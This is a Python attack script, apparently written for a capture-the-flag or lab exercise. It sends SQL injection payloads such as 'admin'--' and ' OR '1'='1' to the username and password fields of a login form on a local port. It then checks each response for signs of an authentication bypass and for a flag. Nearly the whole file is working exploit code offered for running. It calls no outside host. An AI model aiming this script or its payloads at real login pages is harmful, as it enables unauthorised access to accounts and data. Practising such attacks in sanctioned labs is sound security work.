import requests
import urllib.parse
import sys

def test_basic_connection():
    """Test if the target is accessible"""
    try:
        print("Testing basic connection to target...")
        response = requests.get("http://127.0.0.1:33148/login", timeout=10)
        print(f"GET Status: {response.status_code}")
        print(f"Content-Length: {len(response.content)}")
        return True
    except Exception as e:
        print(f"Connection failed: {e}")
        return False

def test_simple_payloads():
    """Test with minimal payload set"""
    target_url = "http://127.0.0.1:33148/login"
    
    # Minimal but effective payload set
    payloads = [
        {"payload": "admin'--", "type": "classic"},
        {"payload": "' OR '1'='1", "type": "boolean"},
        {"payload": urllib.parse.quote("admin'--"), "type": "url_encoded"},
        {"payload": "ad'||'min", "type": "concat"},
    ]
    
    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    
    print(f"\nTesting payloads against {target_url}")
    print("="*60)
    
    results = []
    
    for idx, payload_data in enumerate(payloads):
        payload = payload_data['payload']
        ptype = payload_data['type']
        
        # Test in username field
        try:
            print(f"\n[TEST {idx}] Type: {ptype}")
            print(f"Payload: {payload}")
            
            data = f"username={payload}&password=dummy123"
            response = requests.post(target_url, headers=headers, data=data, timeout=15, allow_redirects=False)
            
            print(f"Status: {response.status_code}")
            print(f"Length: {len(response.content)}B")
            
            if response.status_code in [301, 302, 303, 307, 308]:
                print(f"REDIRECT TO: {response.headers.get('Location', 'N/A')}")
            
            content_lower = response.text.lower()
            has_admin = 'admin' in content_lower
            has_flag = 'flag' in content_lower
            has_welcome = 'welcome' in content_lower
            has_logout = 'logout' in content_lower
            has_cookies = len(response.cookies) > 0
            
            print(f"Indicators - admin:{has_admin} flag:{has_flag} welcome:{has_welcome} logout:{has_logout} cookies:{has_cookies}")
            
            # Store result
            result = {
                'field': 'username',
                'payload': payload,
                'type': ptype,
                'status': response.status_code,
                'admin': has_admin,
                'flag': has_flag,
                'welcome': has_welcome,
                'logout': has_logout,
                'cookies': has_cookies
            }
            
            results.append(result)
            
            if has_flag:
                print(f"[!] FLAG PATTERN FOUND!")
                print(f"Response: {response.text[:500]}")
            
        except Exception as e:
            print(f"ERROR in username test: {e}")
        
        # Test in password field
        try:
            data = f"username=dummy123&password={payload}"
            response = requests.post(target_url, headers=headers, data=data, timeout=15, allow_redirects=False)
            
            print(f"[Password field] Status: {response.status_code}, Length: {len(response.content)}B")
            
            content_lower = response.text.lower()
            has_admin = 'admin' in content_lower
            has_flag = 'flag' in content_lower
            has_welcome = 'welcome' in content_lower
            has_logout = 'logout' in content_lower
            has_cookies = len(response.cookies) > 0
            
            result = {
                'field': 'password',
                'payload': payload,
                'type': ptype,
                'status': response.status_code,
                'admin': has_admin,
                'flag': has_flag,
                'welcome': has_welcome,
                'logout': has_logout,
                'cookies': has_cookies
            }
            
            results.append(result)
            
            if has_flag:
                print(f"[!] FLAG PATTERN FOUND in password field!")
                print(f"Response: {response.text[:500]}")
                
        except Exception as e:
            print(f"ERROR in password test: {e}")
    
    # Summary
    print("\n" + "="*60)
    print("SUMMARY")
    print("="*60)
    
    successful = [r for r in results if r['admin'] or r['flag'] or r['welcome'] or r['logout'] or r['cookies']]
    flag_results = [r for r in results if r['flag']]
    
    print(f"Total tests: {len(results)}")
    print(f"Interesting results: {len(successful)}")
    print(f"Flag patterns: {len(flag_results)}")
    
    if successful:
        print("\n[INTERESTING RESULTS]")
        for r in successful:
            print(f"{r['field']}: {r['type']} - admin:{r['admin']} flag:{r['flag']} welcome:{r['welcome']} logout:{r['logout']} cookies:{r['cookies']}")
    
    return results

if __name__ == "__main__":
    if test_basic_connection():
        test_simple_payloads()
    else:
        print("Cannot connect to target. Exiting.")
        sys.exit(1)

